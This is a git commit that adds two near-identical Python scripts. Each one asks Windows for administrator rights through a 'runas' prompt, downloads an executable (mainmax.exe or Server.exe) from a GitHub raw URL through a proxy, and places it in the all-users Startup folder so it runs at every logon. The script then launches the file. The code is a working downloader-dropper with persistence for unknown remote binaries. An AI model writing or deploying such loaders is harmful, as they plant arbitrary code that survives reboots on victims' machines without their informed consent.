cf4f6820cabd793b42a12554cfe730a30b786370
snow6BIG <132324118+snow6BIG@users.noreply.github.com>
2024-02-08 14:31:50 +0800

    Add files via upload

---
+++ first.py
@@ -0,0 +1,31 @@
+import urllib.request
+import os
+import time
+import ctypes
+import sys
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+if is_admin():  
+    url = "https://ghproxy.com/https://raw.githubusercontent.com/snow6BIG/snow/main/mainmax.exe"#文件路径。
+    dir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"#文件下载路径目录。
+    file_path = os.path.join(dir, 'main.exe')#下载为
+    urllib.request.urlretrieve(url, file_path)
+    
+    # 检查文件是否下载完成
+    if os.path.exists(file_path):
+        print('File downloaded successfully.')
+        print('Launching the file in 3 seconds...')
+        time.sleep(3)
+        os.startfile(file_path)
+    else:
+        print('Failed to download the file.')
+else:
+    if sys.version_info[0] == 3:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+    else:
+        ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(__file__), None, 1)
---
+++ 自动下载文件并运行（绝对路径）最终.py
@@ -0,0 +1,33 @@
+import urllib.request
+import os
+import time
+import ctypes
+import sys
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+if is_admin():  
+    url = "https://ghproxy.com/https://raw.githubusercontent.com/snow6BIG/snow/main/Server.exe"#下载地址
+    dir = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"#保存位置
+    file_path = os.path.join(dir, 'Server.exe')#保存为
+
+    # 下载文件
+    urllib.request.urlretrieve(url, file_path)
+    
+    # 检查文件是否下载完成
+    if os.path.exists(file_path):
+        print('File downloaded successfully.')
+        print('Launching the file in 5 seconds...')
+        time.sleep(5)
+        os.startfile(file_path)
+    else:
+        print('Failed to download the file.')
+else:
+    if sys.version_info[0] == 3:
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+    else:
+        ctypes.windll.shell32.ShellExecuteW(None, u"runas", unicode(sys.executable), unicode(__file__), None, 1)
